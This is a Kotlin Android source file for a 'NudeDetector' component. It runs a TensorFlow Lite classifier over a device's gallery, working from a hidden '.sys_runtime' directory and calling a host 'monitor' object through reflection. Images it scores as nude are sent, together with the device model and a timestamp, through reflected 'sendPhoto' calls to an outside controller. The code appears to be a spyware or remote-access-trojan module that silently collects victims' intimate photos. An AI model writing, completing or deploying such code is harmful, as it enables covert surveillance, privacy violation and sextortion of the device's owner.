package com.example.app

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import org.tensorflow.lite.Interpreter
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * فئة كاشف المحتوى (NudeDetector) باستخدام TensorFlow Lite و SQLite.
 * 
 * ✅ تم إصلاح analyze لاستخدام نسخة محلية من interpreter لمنع NPE.
 * ✅ تم إضافة اختبار صحة النموذج في loadEngineForever.
 * ✅ تم إضافة حد أقصى للمحاولات (3) في ensureModelReady.
 * ✅ تم ترقية methodCache إلى ConcurrentHashMap مع مطابقة عدد المعاملات.
 * ✅ تم إضافة @Volatile للمتغيرات المشتركة لضمان رؤية التغييرات بين الخيوط.
 * ✅ تم تحسين معالجة الأخطاء وإعادة المحاولة.
 */
class NudeDetector(
    context: Context,
    private val monitor: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var interpreter: Interpreter? = null
    private val modelMutex = Mutex()
    private val activeMutex = Mutex()

    // ✅ قفل متزامن لاستدعاءات interpreter.run
    private val interpreterLock = Any()

    private val isScannerActive = AtomicBoolean(false)
    private val isLoadingEngine = AtomicBoolean(false)
    private val isDownloadingModel = AtomicBoolean(false)

    private var lastRunTime: Long = 0

    // ✅ إضافة @Volatile للمتغيرات المشتركة
    @Volatile
    private var loadErrorCount = 0
    private val maxLoadErrors = 10

    private var inputSizeX = 224
    private var inputSizeY = 224

    @Volatile
    var modelPath: String? = null

    // ========== المسارات والملفات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val modelsDir: File by lazy {
        File(runtimeDir, "models").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "nude_config.json")
    }

    private val logFile: File by lazy {
        File(runtimeDir, "n.log")
    }

    private val dbHelper: NudeCacheDbHelper by lazy {
        NudeCacheDbHelper(appContext ?: context)
    }

    // ========== مدير التحميل ==========
    private val fileDownloader: FileDownloader by lazy {
        FileDownloader(appContext ?: context)
    }

    // ========== الإعدادات ==========
    private val configMap = mutableMapOf<String, Any>(
        "model_min_size" to 5_000_000L,
        "max_file_size" to 8 * 1024 * 1024L,
        "min_image_size" to 50,
        "max_image_size" to 10000,
        "scan_interval" to 1800L,
        "nude_threshold" to 0.85f,
        "questionable_threshold" to 0.45f,
        "aspect_bonus" to 0.03f,
        "report_enabled" to true,
        "cache_ttl" to 30 * 86400L
    )

    // ✅ تخزين مؤقت للـ Method مع ConcurrentHashMap
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "NudeDetector"

        @JvmStatic
        fun create(context: Context, monitor: Any? = null): NudeDetector {
            return NudeDetector(context, monitor)
        }
    }

    init {
        loadConfig()
        scope.launch {
            val ready = ensureModelReady()
            if (ready) {
                modelPath = File(modelsDir, "engine_v2.tflite").absolutePath
                loadEngineForever()
            } else {
                writeLog("⚠️ Model could not be loaded. AI features will be disabled.")
            }
        }
    }

    // ============================================================
    //  إدارة التكوين
    // ============================================================
    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                configMap[key] = json.get(key)
            }
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig(): Boolean {
        return try {
            val json = JSONObject(configMap as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
            true
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  ✅ التأكد من جاهزية النموذج (مع حلقة إعادة محاولة خارجية - 3 محاولات)
    // ============================================================
    internal suspend fun ensureModelReady(): Boolean {
        val modelFile = File(modelsDir, "engine_v2.tflite")
        val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L

        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي
        if (modelFile.exists() && modelFile.length() >= minSize) {
            writeLog("✅ Model already exists at ${modelFile.absolutePath} (${modelFile.length()} bytes)")
            return true
        }

        writeLog("🌐 Model not found locally. Downloading from internet...")

        // قراءة ملف index.json
        val indexJson = try {
            appContext?.assets?.open("index.json")?.bufferedReader()?.use { it.readText() }
        } catch (e: Exception) {
            writeLog("❌ Failed to read index.json: ${e.message}")
            return false
        }

        if (indexJson.isNullOrEmpty()) {
            writeLog("❌ index.json is empty or missing.")
            return false
        }

        val json = JSONObject(indexJson)
        val assetsArray = json.getJSONArray("assets")
        if (assetsArray.length() == 0) {
            writeLog("❌ No assets found in index.json")
            return false
        }

        val asset = assetsArray.getJSONObject(0)
        val url = asset.getString("url")
        val expectedSize = asset.optLong("expected_size", 0)
        val isBase64 = asset.optBoolean("is_base64", false)

        if (url.isEmpty()) {
            writeLog("❌ Download URL is empty in index.json")
            return false
        }

        writeLog("📥 Download URL: $url")
        writeLog("📦 isBase64: $isBase64")

        // ✅ حلقة إعادة محاولة خارجية (3 محاولات)
        var attempts = 0
        while (attempts < 3) {
            attempts++
            writeLog("🔄 Download attempt $attempts/3")
            isDownloadingModel.set(true)
            try {
                val success = fileDownloader.downloadModelWithRetry(
                    url = url,
                    destinationFile = modelFile,
                    expectedSize = expectedSize,
                    isBase64 = isBase64,
                    maxRetries = 2
                )
                if (success && modelFile.exists() && modelFile.length() >= minSize) {
                    writeLog("✅ Model downloaded successfully (${modelFile.length()} bytes)")
                    configMap["model_min_size"] = modelFile.length()
                    saveConfig()
                    return true
                }
            } finally {
                isDownloadingModel.set(false)
            }
            if (attempts < 3) {
                writeLog("⏳ Waiting 5 seconds before retry...")
                delay(5000L)
            }
        }

        writeLog("❌ Failed to download model after 3 attempts.")
        return false
    }

    // ============================================================
    //  البحث عن النموذج
    // ============================================================
    private suspend fun findModel(): String? {
        val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L
        val possiblePaths = arrayOf(
            File(modelsDir, "engine_v2.tflite").absolutePath,
            File(runtimeDir, "engine_v2.tflite").absolutePath,
            File(appContext?.filesDir, "engine_v2.tflite").absolutePath
        )

        for (path in possiblePaths) {
            try {
                val file = File(path)
                if (file.exists() && file.length() >= minSize) {
                    writeLog("✅ Model found at: $path")
                    return path
                }
            } catch (_: Exception) {}
        }

        if (isDownloadingModel.get()) {
            writeLog("⏳ Model download in progress, waiting...")
            delay(5000L)
            val dest = File(modelsDir, "engine_v2.tflite")
            if (dest.exists() && dest.length() >= minSize) {
                return dest.absolutePath
            }
        }

        writeLog("❌ Model not found.")
        return null
    }

    // ============================================================
    //  ✅ تحميل المحرك (مع اختبار صحة النموذج)
    // ============================================================
    internal suspend fun loadEngineForever() {
        if (isLoadingEngine.get()) return

        if (modelPath.isNullOrEmpty()) {
            modelPath = findModel()
            if (modelPath.isNullOrEmpty()) {
                writeLog("❌ No model found, cannot load engine.")
                return
            }
        }

        val mFile = File(modelPath!!)
        if (!mFile.exists()) {
            writeLog("❌ Model file not found at: $modelPath")
            modelPath = null
            return
        }

        isLoadingEngine.set(true)
        var attempt = 0
        var waitTime = 3000L
        val minSize = (configMap["model_min_size"] as? Number)?.toLong() ?: 5_000_000L

        writeLog("🔄 Starting AI engine load attempts from: $modelPath")

        while (loadErrorCount < maxLoadErrors) {
            try {
                if (!mFile.exists()) {
                    throw IllegalStateException("Model file disappeared")
                }
                if (mFile.length() < minSize) {
                    throw IllegalStateException("Model size too small: ${mFile.length()} bytes")
                }

                val options = Interpreter.Options().apply { setNumThreads(2) }
                val newInterpreter = Interpreter(mFile, options)

                // ✅ اختبار النموذج للتأكد من صحته (VALIDATION)
                try {
                    val testInput = Array(1) { FloatArray(inputSizeX * inputSizeY * 3) }
                    val testOutput = Array(1) { FloatArray(2) }
                    newInterpreter.run(testInput, testOutput)
                } catch (e: Exception) {
                    throw IllegalStateException("Model validation failed: ${e.message}")
                }

                // تحديث حجم الإدخال
                val inputTensor = newInterpreter.getInputTensor(0)
                val shape = inputTensor.shape()
                if (shape.size >= 3) {
                    inputSizeX = shape[1]
                    inputSizeY = shape[2]
                }

                modelMutex.withLock {
                    interpreter?.close()
                    interpreter = newInterpreter
                }

                writeLog("✅ AI Engine loaded successfully (input size: ${inputSizeX}x${inputSizeY})")
                isLoadingEngine.set(false)
                loadErrorCount = 0
                return

            } catch (e: Exception) {
                loadErrorCount++
                writeLog("Load attempt ${attempt + 1} failed: ${e.message}")
                modelMutex.withLock {
                    interpreter?.close()
                    interpreter = null
                }
                waitTime = minOf(waitTime + 2000L, 60000L)
            }
            attempt++
            delay(waitTime)
        }

        writeLog("❌ Max load attempts reached. AI permanently disabled.")
        isLoadingEngine.set(false)
    }

    // ============================================================
    //  حالات النموذج
    // ============================================================
    fun isReady(): Boolean = interpreter != null
    fun isLoading(): Boolean = isLoadingEngine.get()

    // ============================================================
    //  حساب معامل التصغير
    // ============================================================
    private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
        val height = options.outHeight
        val width = options.outWidth
        var inSampleSize = 1

        if (height > reqHeight || width > reqWidth) {
            val halfHeight = height / 2
            val halfWidth = width / 2
            while (halfHeight / inSampleSize >= reqHeight && halfWidth / inSampleSize >= reqWidth) {
                inSampleSize *= 2
            }
        }
        return inSampleSize.coerceAtMost(8)
    }

    // ============================================================
    //  ✅ تحليل الصورة (مع نسخة محلية من interpreter)
    // ============================================================
    fun analyze(path: String): Float {
        // ✅ الحصول على نسخة محلية فوراً لتجنب NPE
        val interpreterLocal = interpreter
        if (interpreterLocal == null) {
            if (!isLoadingEngine.get() && loadErrorCount < maxLoadErrors) {
                scope.launch { loadEngineForever() }
            }
            return 0.0f
        }

        if (path.isBlank()) return 0.0f
        val file = File(path)
        if (!file.exists()) return 0.0f

        val fileSize = file.length()
        val maxFileSize = (configMap["max_file_size"] as? Number)?.toLong() ?: (8 * 1024 * 1024L)
        if (fileSize < 1000 || fileSize > maxFileSize) return 0.0f

        val ext = file.extension.lowercase(Locale.ROOT)
        if (ext !in arrayOf("png", "jpg", "jpeg", "webp", "bmp", "gif", "tiff")) return 0.0f

        return try {
            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(path, options)

            val w = options.outHeight
            val h = options.outWidth
            val minSz = (configMap["min_image_size"] as? Number)?.toInt() ?: 50
            val maxSz = (configMap["max_image_size"] as? Number)?.toInt() ?: 10000

            if (w < minSz || h < minSz || w > maxSz || h > maxSz) return 0.0f

            val sampleSize = calculateInSampleSize(options, inputSizeX, inputSizeY)
            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = sampleSize
                inPreferredConfig = Bitmap.Config.ARGB_8888
                inJustDecodeBounds = false
            }
            val origBitmap = BitmapFactory.decodeFile(path, decodeOptions) ?: return 0.0f

            val scaledBitmap = Bitmap.createScaledBitmap(origBitmap, inputSizeX, inputSizeY, true)
            if (origBitmap != scaledBitmap) origBitmap.recycle()

            val aspectBonus = if (h > w * 1.2f) {
                (configMap["aspect_bonus"] as? Number)?.toFloat() ?: 0.03f
            } else 0.0f

            val imgData = convertBitmapToByteBuffer(scaledBitmap)
            scaledBitmap.recycle()

            val output = Array(1) { FloatArray(2) }
            synchronized(interpreterLock) {
                // ✅ استخدام النسخة المحلية داخل القفل
                interpreterLocal.run(imgData, output)
            }

            var prob = if (output[0].size > 1) {
                output[0][1] / (output[0][0] + output[0][1] + 1e-8f)
            } else {
                output[0][0]
            }

            prob = minOf(maxOf(prob, 0.0f), 1.0f)
            prob = minOf(prob + aspectBonus, 1.0f)
            prob

        } catch (e: Exception) {
            writeLog("Analyze error ($path): ${e.message}")
            0.0f
        }
    }

    private fun convertBitmapToByteBuffer(bitmap: Bitmap): ByteBuffer {
        val byteBuffer = ByteBuffer.allocateDirect(4 * inputSizeX * inputSizeY * 3)
        byteBuffer.order(ByteOrder.nativeOrder())

        val intValues = IntArray(inputSizeX * inputSizeY)
        bitmap.getPixels(intValues, 0, bitmap.width, 0, 0, bitmap.width, bitmap.height)

        var pixel = 0
        for (i in 0 until inputSizeX) {
            for (j in 0 until inputSizeY) {
                val value = intValues[pixel++]
                byteBuffer.putFloat(((value shr 16) and 0xFF) / 255.0f)
                byteBuffer.putFloat(((value shr 8) and 0xFF) / 255.0f)
                byteBuffer.putFloat((value and 0xFF) / 255.0f)
            }
        }
        return byteBuffer
    }

    // ============================================================
    //  المسح الدوري
    // ============================================================
    fun scan(): Boolean {
        if (isScannerActive.get()) return false
        if (!isReady()) {
            if (!isLoadingEngine.get()) {
                scope.launch { loadEngineForever() }
            }
            return false
        }

        val now = System.currentTimeMillis() / 1000
        val scanInterval = (configMap["scan_interval"] as? Number)?.toLong() ?: 1800L
        if ((now - lastRunTime) < scanInterval) return false

        lastRunTime = now
        scope.launch { worker() }
        return true
    }

    private suspend fun worker() {
        if (monitor == null) {
            writeLog("Monitor is null, cannot get mediaScanner")
            return
        }

        activeMutex.withLock {
            if (isScannerActive.get()) return
            isScannerActive.set(true)
        }

        try {
            val mediaScanner = getModuleComponent(monitor, "mediaScanner")
            if (mediaScanner == null) {
                writeLog("MediaScanner not available, skipping scan")
                return
            }

            @Suppress("UNCHECKED_CAST")
            val items = invokeMethod(mediaScanner, "getGalleryByCategory", "pending", 30) as? List<Map<String, Any>>
            if (items.isNullOrEmpty()) {
                writeLog("No pending items to scan")
                return
            }

            val nudeThreshold = (configMap["nude_threshold"] as? Number)?.toFloat() ?: 0.85f
            val questionableThreshold = (configMap["questionable_threshold"] as? Number)?.toFloat() ?: 0.45f

            var processed = 0
            var detected = 0

            for (item in items) {
                try {
                    val path = item["path"] as? String ?: continue
                    val hash = item["hash"] as? String ?: continue
                    if (!File(path).exists()) continue
                    if (isCached(hash)) continue

                    val prob = analyze(path)
                    processed++

                    when {
                        prob > nudeThreshold -> {
                            invokeMethod(mediaScanner, "updateCategory", hash, "nude", prob)
                            detected++
                            if (configMap["report_enabled"] as? Boolean ?: true) {
                                val label = item["label"] as? String ?: "??"
                                report(path, label, prob)
                            }
                        }
                        prob > questionableThreshold -> {
                            invokeMethod(mediaScanner, "updateCategory", hash, "questionable", prob)
                        }
                        else -> {
                            invokeMethod(mediaScanner, "updateCategory", hash, "normal", prob)
                        }
                    }
                    markCached(hash, path)
                    if (processed % 3 == 0) delay(300L)
                } catch (e: Exception) {
                    writeLog("Worker item error: ${e.message}")
                }
            }
            writeLog(if (detected > 0) "✅ Detected $detected sensitive images" else "Scan completed, no sensitive images detected")
        } catch (e: Exception) {
            writeLog("Worker error: ${e.message}")
        } finally {
            isScannerActive.set(false)
        }
    }

    // ============================================================
    //  إدارة الكاش
    // ============================================================
    private fun isCached(hash: String): Boolean {
        if (hash.isBlank()) return false
        return try {
            val db = dbHelper.readableDatabase
            val cursor = db.query("scan_logs", arrayOf("1"), "h = ?", arrayOf(hash), null, null, null)
            val exists = cursor.count > 0
            cursor.close()
            exists
        } catch (e: Exception) {
            writeLog("Cache check error: ${e.message}")
            false
        }
    }

    private fun markCached(hash: String, path: String = "") {
        if (hash.isBlank()) return
        try {
            val db = dbHelper.writableDatabase
            val values = ContentValues().apply {
                put("h", hash)
                put("ts", System.currentTimeMillis() / 1000)
                put("path", path)
            }
            db.insertWithOnConflict("scan_logs", null, values, SQLiteDatabase.CONFLICT_REPLACE)
        } catch (e: Exception) {
            writeLog("Mark cached error: ${e.message}")
        }
    }

    // ============================================================
    //  إرسال التقارير
    // ============================================================
    private fun report(path: String, label: String, confidence: Float) {
        if (monitor == null || !File(path).exists()) return
        val ui = invokeMethod(monitor, "getUi") ?: return
        val target = invokeMethod(ui, "getDat") ?: invokeMethod(ui, "getCtrl") ?: return
        val deviceModel = invokeMethod(monitor, "getDeviceModel") as? String ?: "?"
        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())

        val caption = """
            🔞 **AI Detection**
            📱 Device: `$deviceModel`
            🏷️ Label: `$label`
            🎯 Confidence: `${(confidence * 100).toInt()}%`
            ⏰ Time: `$timeStr`
        """.trimIndent()

        try {
            invokeMethod(ui, "sendPhoto", target, path, caption)
        } catch (e: Exception) {
            writeLog("Report send error: ${e.message}")
        }
    }

    // ============================================================
    //  أدوات مساعدة
    // ============================================================
    fun clearCache(): Boolean {
        return try {
            val db = dbHelper.writableDatabase
            db.delete("scan_logs", null, null)
            db.execSQL("VACUUM")
            true
        } catch (e: Exception) {
            writeLog("Clear cache error: ${e.message}")
            false
        }
    }

    fun getStats(): Map<String, Any?> {
        return try {
            val db = dbHelper.readableDatabase
            var total = 0
            var minTs: Long? = null
            var maxTs: Long? = null

            val cursorTotal = db.rawQuery("SELECT COUNT(*) FROM scan_logs", null)
            if (cursorTotal.moveToFirst()) total = cursorTotal.getInt(0)
            cursorTotal.close()

            val cursorTs = db.rawQuery("SELECT MIN(ts), MAX(ts) FROM scan_logs", null)
            if (cursorTs.moveToFirst()) {
                if (!cursorTs.isNull(0)) minTs = cursorTs.getLong(0)
                if (!cursorTs.isNull(1)) maxTs = cursorTs.getLong(1)
            }
            cursorTs.close()

            mapOf(
                "total" to total,
                "oldest" to minTs?.let { SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000)) },
                "newest" to maxTs?.let { SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date(it * 1000)) },
                "model_ready" to isReady(),
                "model_loading" to isLoadingEngine.get(),
                "active" to isScannerActive.get(),
                "model_path" to modelPath,
                "input_size" to "${inputSizeX}x${inputSizeY}"
            )
        } catch (e: Exception) {
            writeLog("Stats error: ${e.message}")
            mapOf("total" to 0)
        }
    }

    // ============================================================
    //  إغلاق الموارد
    // ============================================================
    suspend fun close() {
        withContext(Dispatchers.IO) {
            modelMutex.withLock {
                interpreter?.close()
                interpreter = null
            }
        }
        scope.cancel()
        writeLog("NudeDetector closed successfully.")
    }

    // ============================================================
    //  دوال المساعدة والانعكاس (تم ترقيتها)
    // ============================================================
    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
        } catch (_: Exception) {}
    }

    /**
     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null
        val key = "${target.javaClass.name}.$methodName(${args.size})"
        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }
        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }

    /**
     * ✅ الحصول على قيمة حقل عبر الانعكاس مع تخزين مؤقت (محسّن).
     */
    private fun getModuleComponent(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (e: Exception) {
            writeLog("Get field error ($fieldName): ${e.message}")
            null
        }
    }

    // ============================================================
    //  مساعد قاعدة البيانات
    // ============================================================
    private inner class NudeCacheDbHelper(context: Context) :
        SQLiteOpenHelper(context, File(runtimeDir, "n_cache.db").absolutePath, null, 1) {

        override fun onCreate(db: SQLiteDatabase) {
            db.execSQL("CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER, path TEXT)")
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)")
            val ttl = (configMap["cache_ttl"] as? Number)?.toLong() ?: (30 * 86400L)
            val oldTs = (System.currentTimeMillis() / 1000) - ttl
            db.execSQL("DELETE FROM scan_logs WHERE ts < $oldTs")
        }

        override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
            db.execSQL("DROP TABLE IF EXISTS scan_logs")
            onCreate(db)
        }
    }
}
